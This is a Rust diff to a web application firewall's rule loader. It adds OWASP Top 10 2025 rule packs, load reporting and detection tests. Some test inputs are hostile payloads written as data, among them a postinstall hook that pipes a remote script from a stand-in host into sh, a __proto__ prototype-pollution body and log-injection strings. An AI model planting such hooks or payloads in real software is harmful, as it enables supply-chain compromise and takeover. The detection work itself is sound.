@@ -126,6 +126,43 @@ pub struct RuleSet {
     rules: Vec<BuiltinRule>,
 }
 
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct RuleLoadReport {
+    pub files: Vec<RuleFileLoadReport>,
+    pub standards: Vec<String>,
+    pub total_entries: usize,
+    pub enabled_entries: usize,
+    pub disabled_entries: usize,
+    pub compiled_rules: usize,
+    pub filtered_by_paranoia: usize,
+    pub active_rules: usize,
+    pub exclusions: RuleExclusionReport,
+    pub warnings: Vec<String>,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct RuleFileLoadReport {
+    pub path: String,
+    pub name: Option<String>,
+    pub version: Option<String>,
+    pub standards: Vec<String>,
+    pub entries: usize,
+    pub enabled_entries: usize,
+    pub disabled_entries: usize,
+    pub compiled_rules: usize,
+    pub filtered_by_paranoia: usize,
+    pub active_rules: usize,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct RuleExclusionReport {
+    pub configured: usize,
+    pub scoped: usize,
+    pub global: usize,
+    pub disabled_rule_ids: Vec<String>,
+    pub disabled_categories: Vec<String>,
+}
+
 impl RuleSet {
     pub fn rules(&self) -> &[BuiltinRule] {
         &self.rules
@@ -172,6 +209,42 @@ impl RuleSet {
     }
 }
 
+impl RuleExclusionReport {
+    fn from_exclusions(exclusions: &[RuleExclusionConfig]) -> Self {
+        let mut disabled_rule_ids = Vec::new();
+        let mut disabled_categories = Vec::new();
+        let mut scoped = 0;
+        let mut global = 0;
+
+        for exclusion in exclusions {
+            disabled_rule_ids.extend(exclusion.rule_ids.iter().cloned());
+            disabled_categories.extend(exclusion.categories.iter().cloned());
+
+            if exclusion.path_prefixes.is_empty()
+                && exclusion.query_params.is_empty()
+                && exclusion.headers.is_empty()
+            {
+                global += 1;
+            } else {
+                scoped += 1;
+            }
+        }
+
+        disabled_rule_ids.sort();
+        disabled_rule_ids.dedup();
+        disabled_categories.sort();
+        disabled_categories.dedup();
+
+        Self {
+            configured: exclusions.len(),
+            scoped,
+            global,
+            disabled_rule_ids,
+            disabled_categories,
+        }
+    }
+}
+
 #[derive(Debug, Clone, Copy, Deserialize, Serialize, PartialEq, Eq)]
 #[serde(rename_all = "snake_case")]
 pub enum RuleTransform {
@@ -191,37 +264,76 @@ pub struct RequestParts<'a> {
 
 const DEFAULT_RULE_PACKS: &[&str] = &[
     include_str!("../configs/rules/REQUEST-913-SCANNER-DETECTION.yml"),
+    include_str!("../configs/rules/REQUEST-914-AUTHENTICATION-ABUSE.yml"),
+    include_str!("../configs/rules/REQUEST-916-INSECURE-DESIGN.yml"),
     include_str!("../configs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.yml"),
+    include_str!("../configs/rules/REQUEST-921-CRYPTO-TRANSPORT.yml"),
     include_str!("../configs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.yml"),
     include_str!("../configs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.yml"),
     include_str!("../configs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.yml"),
     include_str!("../configs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.yml"),
+    include_str!("../configs/rules/REQUEST-944-SUPPLY-CHAIN.yml"),
+    include_str!("../configs/rules/REQUEST-945-INTEGRITY.yml"),
+    include_str!("../configs/rules/REQUEST-949-LOGGING-ALERTING.yml"),
+    include_str!("../configs/rules/REQUEST-950-EXCEPTIONAL-CONDITIONS.yml"),
 ];
 
 pub fn builtin_rules() -> Result<Vec<BuiltinRule>, RuleError> {
     let mut rules = Vec::new();
 
     for contents in DEFAULT_RULE_PACKS {
-        rules.extend(compile_rule_pack(contents, "<embedded saugra rule pack>")?);
+        let (mut pack_rules, _report) =
+            compile_rule_pack(contents, "<embedded saugra rule pack>", u8::MAX)?;
+        rules.append(&mut pack_rules);
     }
 
     Ok(rules)
 }
 
 pub fn load_rule_set(settings: &RuleSettings) -> Result<RuleSet, RuleError> {
+    load_rule_set_with_report(settings).map(|(rule_set, _report)| rule_set)
+}
+
+pub fn load_rule_set_with_report(
+    settings: &RuleSettings,
+) -> Result<(RuleSet, RuleLoadReport), RuleError> {
     let mut rules = Vec::new();
+    let mut report = RuleLoadReport {
+        files: Vec::new(),
+        standards: Vec::new(),
+        total_entries: 0,
+        enabled_entries: 0,
+        disabled_entries: 0,
+        compiled_rules: 0,
+        filtered_by_paranoia: 0,
+        active_rules: 0,
+        exclusions: RuleExclusionReport::from_exclusions(&settings.exclusions),
+        warnings: Vec::new(),
+    };
 
     for path in &settings.files {
-        rules.extend(load_rule_file(path)?);
+        let (mut file_rules, file_report) = load_rule_file(path, settings.paranoia_level)?;
+        report.total_entries += file_report.entries;
+        report.enabled_entries += file_report.enabled_entries;
+        report.disabled_entries += file_report.disabled_entries;
+        report.compiled_rules += file_report.compiled_rules;
+        report.filtered_by_paranoia += file_report.filtered_by_paranoia;
+        report.active_rules += file_report.active_rules;
+        report
+            .standards
+            .extend(file_report.standards.iter().cloned());
+        report.files.push(file_report);
+        rules.append(&mut file_rules);
     }
 
-    rules.retain(|rule| rule.paranoia_level <= settings.paranoia_level);
+    report.standards.sort();
+    report.standards.dedup();
 
     if rules.is_empty() {
         return Err(RuleError::EmptyRuleSet);
     }
 
-    Ok(RuleSet { rules })
+    Ok((RuleSet { rules }, report))
 }
 
 pub fn inspect(parts: &RequestParts<'_>) -> Result<Vec<RuleMatch>, RuleError> {
@@ -231,17 +343,24 @@ pub fn inspect(parts: &RequestParts<'_>) -> Result<Vec<RuleMatch>, RuleError> {
     .inspect(parts))
 }
 
-fn load_rule_file(path: &Path) -> Result<Vec<BuiltinRule>, RuleError> {
+fn load_rule_file(
+    path: &Path,
+    paranoia_level: u8,
+) -> Result<(Vec<BuiltinRule>, RuleFileLoadReport), RuleError> {
     let path_display = path.display().to_string();
     let contents = fs::read_to_string(path).map_err(|source| RuleError::Io {
         path: path_display.clone(),
         source,
     })?;
 
-    compile_rule_pack(&contents, &path_display)
+    compile_rule_pack(&contents, &path_display, paranoia_level)
 }
 
-fn compile_rule_pack(contents: &str, source_name: &str) -> Result<Vec<BuiltinRule>, RuleError> {
+fn compile_rule_pack(
+    contents: &str,
+    source_name: &str,
+    paranoia_level: u8,
+) -> Result<(Vec<BuiltinRule>, RuleFileLoadReport), RuleError> {
     let rule_file: RuleFile = serde_yaml::from_str(contents).map_err(|source| RuleError::Yaml {
         path: source_name.to_string(),
         source,
@@ -254,18 +373,54 @@ fn compile_rule_pack(contents: &str, source_name: &str) -> Result<Vec<BuiltinRul
     }
 
     let mut rules = Vec::new();
+    let mut report = RuleFileLoadReport {
+        path: source_name.to_string(),
+        name: rule_file
+            .metadata
+            .as_ref()
+            .map(|metadata| metadata.name.clone()),
+        version: rule_file
+            .metadata
+            .as_ref()
+            .map(|metadata| metadata.version.clone()),
+        standards: rule_file
+            .metadata
+            .as_ref()
+            .map(|metadata| metadata.standards.clone())
+            .unwrap_or_default(),
+        entries: rule_file.rules.len(),
+        enabled_entries: 0,
+        disabled_entries: 0,
+        compiled_rules: 0,
+        filtered_by_paranoia: 0,
+        active_rules: 0,
+    };
 
     for entry in rule_file.rules {
+        if !entry.enabled {
+            report.disabled_entries += 1;
+            continue;
+        }
+
+        report.enabled_entries += 1;
         if entry.enabled && entry.targets.is_empty() {
             return Err(RuleError::MissingTargets { rule_id: entry.id });
         }
 
         for definition in Vec::<RuleDefinition>::from(entry) {
-            rules.push(BuiltinRule::try_from(definition)?);
+            let rule = BuiltinRule::try_from(definition)?;
+            report.compiled_rules += 1;
+            if rule.paranoia_level > paranoia_level {
+                report.filtered_by_paranoia += 1;
+                continue;
+            }
+
+            rules.push(rule);
+            report.active_rules += 1;
         }
     }
 
-    Ok(rules)
+    Ok((rules, report))
 }
 
 fn normalize_rule_input(target: RuleTarget, input: &str, transforms: &[RuleTransform]) -> String {
@@ -371,7 +526,17 @@ struct RuleDefinition {
 
 #[derive(Debug, Deserialize)]
 struct RuleFile {
+    #[serde(default)]
+    metadata: Option<RuleFileMetadata>,
     rules: Vec<RuleFileEntry>,
+}
+
+#[derive(Debug, Deserialize)]
+struct RuleFileMetadata {
+    name: String,
+    version: String,
+    #[serde(default)]
+    standards: Vec<String>,
 }
 
 #[derive(Debug, Deserialize)]
@@ -455,6 +620,48 @@ impl TryFrom<RuleDefinition> for BuiltinRule {
 mod tests {
     use super::*;
     use crate::config::{RuleExclusionConfig, RuleSettings};
+    use std::collections::BTreeSet;
+
+    #[test]
+    fn default_rules_cover_all_owasp_top_10_2025_categories() {
+        let categories = builtin_rules()
+            .unwrap()
+            .into_iter()
+            .filter_map(|rule| rule.owasp_category)
+            .map(|category| {
+                category
+                    .split_once('-')
+                    .map(|(id, _)| id.to_string())
+                    .unwrap_or(category)
+            })
+            .collect::<BTreeSet<_>>();
+
+        let expected = BTreeSet::from([
+            "A01:2025".to_string(),
+            "A02:2025".to_string(),
+            "A03:2025".to_string(),
+            "A04:2025".to_string(),
+            "A05:2025".to_string(),
+            "A06:2025".to_string(),
+            "A07:2025".to_string(),
+            "A08:2025".to_string(),
+            "A09:2025".to_string(),
+            "A10:2025".to_string(),
+        ]);
+
+        assert_eq!(categories, expected);
+    }
+
+    #[test]
+    fn default_rule_packs_declare_owasp_2025_standard_metadata() {
+        let (_rule_set, report) = load_rule_set_with_report(&RuleSettings::default()).unwrap();
+
+        assert_eq!(report.standards, vec!["owasp-top-10:2025"]);
+        assert!(report
+            .files
+            .iter()
+            .all(|file| file.standards == vec!["owasp-top-10:2025"]));
+    }
 
     #[test]
     fn detects_sql_injection() {
@@ -532,6 +739,87 @@ mod tests {
         .unwrap();
 
         assert_eq!(matches[0].rule_id, "SAUGRA-CMD-001");
+    }
+
+    #[test]
+    fn detects_supply_chain_install_script_payload() {
+        let matches = inspect(&RequestParts {
+            body: r#"{"scripts":{"postinstall":"curl https://example.invalid/i.sh | sh"}}"#,
+            ..RequestParts::default()
+        })
+        .unwrap();
+
+        assert_eq!(matches[0].rule_id, "SAUGRA-SC-001");
+        assert_eq!(
+            matches[0].owasp_category.as_deref(),
+            Some("A03:2025-Software Supply Chain Failures")
+        );
+    }
+
+    #[test]
+    fn detects_insecure_forwarded_protocol() {
+        let matches = inspect(&RequestParts {
+            headers: "x-forwarded-proto: http",
+            ..RequestParts::default()
+        })
+        .unwrap();
+
+        assert_eq!(matches[0].rule_id, "SAUGRA-CRYPTO-001");
+    }
+
+    #[test]
+    fn detects_method_override_design_risk() {
+        let matches = inspect(&RequestParts {
+            headers: "x-http-method-override: delete",
+            ..RequestParts::default()
+        })
+        .unwrap();
+
+        assert_eq!(matches[0].rule_id, "SAUGRA-DESIGN-001");
+    }
+
+    #[test]
+    fn detects_auth_secret_in_url() {
+        let matches = inspect(&RequestParts {
+            query: "password=secret",
+            ..RequestParts::default()
+        })
+        .unwrap();
+
+        assert_eq!(matches[0].rule_id, "SAUGRA-AUTH-002");
+    }
+
+    #[test]
+    fn detects_integrity_failure_payloads() {
+        let matches = inspect(&RequestParts {
+            body: r#"{"__proto__":{"admin":true}}"#,
+            ..RequestParts::default()
+        })
+        .unwrap();
+
+        assert_eq!(matches[0].rule_id, "SAUGRA-INTEGRITY-001");
+    }
+
+    #[test]
+    fn detects_log_injection_payloads() {
+        let matches = inspect(&RequestParts {
+            query: "name=alice%0aERROR status=500",
+            ..RequestParts::default()
+        })
+        .unwrap();
+
+        assert_eq!(matches[0].rule_id, "SAUGRA-LOG-001");
+    }
+
+    #[test]
+    fn detects_exceptional_condition_payloads() {
+        let matches = inspect(&RequestParts {
+            query: "file=%00",
+            ..RequestParts::default()
+        })
+        .unwrap();
+
+        assert_eq!(matches[0].rule_id, "SAUGRA-EXC-001");
     }
 
     #[test]
@@ -701,5 +989,146 @@ rules:
 
         assert_eq!(rule_set.rules().len(), 1);
         assert_eq!(rule_set.rules()[0].id, "LOCAL-PL1-001");
+    }
+
+    #[test]
+    fn validates_regexes_even_when_filtered_by_paranoia_level() {
+        let temp_dir = tempfile::tempdir().unwrap();
+        let rule_path = temp_dir.path().join("bad-paranoia-rules.yml");
+        std::fs::write(
+            &rule_path,
+            r#"
+rules:
+  - id: LOCAL-PL1-001
+    name: PL1 Rule
+    category: local_policy
+    severity: low
+    paranoia_level: 1
+    targets:
+      - query
+    pattern: "pl1"
+    explanation: PL1 rule matched.
+  - id: LOCAL-PL2-BAD-001
+    name: Bad PL2 Rule
+    category: local_policy
+    severity: low
+    paranoia_level: 2
+    targets:
+      - query
+    pattern: "["
+    explanation: Bad regex should fail even when PL2 is inactive.
+"#,
+        )
+        .unwrap();
+
+        let error = load_rule_set_with_report(&RuleSettings {
+            files: vec![rule_path],
+            paranoia_level: 1,
+            ..RuleSettings::default()
+        })
+        .unwrap_err();
+
+        assert!(matches!(error, RuleError::InvalidRegex { .. }));
+    }
+
+    #[test]
+    fn reports_rule_pack_loading_counts() {
+        let temp_dir = tempfile::tempdir().unwrap();
+        let rule_path = temp_dir.path().join("reported-rules.yml");
+        std::fs::write(
+            &rule_path,
+            r#"
+rules:
+  - id: LOCAL-PL1-001
+    name: PL1 Rule
+    category: local_policy
+    severity: low
+    paranoia_level: 1
+    targets:
+      - query
+      - body
+    pattern: "pl1"
+    explanation: PL1 rule matched.
+  - id: LOCAL-PL2-001
+    name: PL2 Rule
+    category: local_policy
+    severity: low
+    paranoia_level: 2
+    targets:
+      - query
+    pattern: "pl2"
+    explanation: PL2 rule matched.
+  - id: LOCAL-DISABLED-001
+    name: Disabled Rule
+    category: local_policy
+    severity: low
+    enabled: false
+    targets:
+      - query
+    pattern: "disabled"
+    explanation: Disabled rule should not load.
+"#,
+        )
+        .unwrap();
+
+        let (_rule_set, report) = load_rule_set_with_report(&RuleSettings {
+            files: vec![rule_path.clone()],
+            paranoia_level: 1,
+            ..RuleSettings::default()
+        })
+        .unwrap();
+
+        assert_eq!(report.files.len(), 1);
+        assert_eq!(report.total_entries, 3);
+        assert_eq!(report.enabled_entries, 2);
+        assert_eq!(report.disabled_entries, 1);
+        assert_eq!(report.compiled_rules, 3);
+        assert_eq!(report.active_rules, 2);
+        assert_eq!(report.filtered_by_paranoia, 1);
+        assert_eq!(report.files[0].path, rule_path.display().to_string());
+    }
+
+    #[test]
+    fn reports_rule_exclusion_scope() {
+        let temp_dir = tempfile::tempdir().unwrap();
+        let rule_path = temp_dir.path().join("one-rule.yml");
+        std::fs::write(
+            &rule_path,
+            r#"
+rules:
+  - id: LOCAL-001
+    name: Local Rule
+    category: local_policy
+    severity: low
+    targets:
+      - query
+    pattern: "local"
+    explanation: Local rule matched.
+"#,
+        )
+        .unwrap();
+
+        let (_rule_set, report) = load_rule_set_with_report(&RuleSettings {
+            files: vec![rule_path],
+            exclusions: vec![
+                RuleExclusionConfig {
+                    rule_ids: vec!["LOCAL-001".to_string()],
+                    ..RuleExclusionConfig::default()
+                },
+                RuleExclusionConfig {
+                    categories: vec!["local_policy".to_string()],
+                    path_prefixes: vec!["/health".to_string()],
+                    ..RuleExclusionConfig::default()
+                },
+            ],
+            ..RuleSettings::default()
+        })
+        .unwrap();
+
+        assert_eq!(report.exclusions.configured, 2);
+        assert_eq!(report.exclusions.global, 1);
+        assert_eq!(report.exclusions.scoped, 1);
+        assert_eq!(report.exclusions.disabled_rule_ids, vec!["LOCAL-001"]);
+        assert_eq!(report.exclusions.disabled_categories, vec!["local_policy"]);
     }
 }
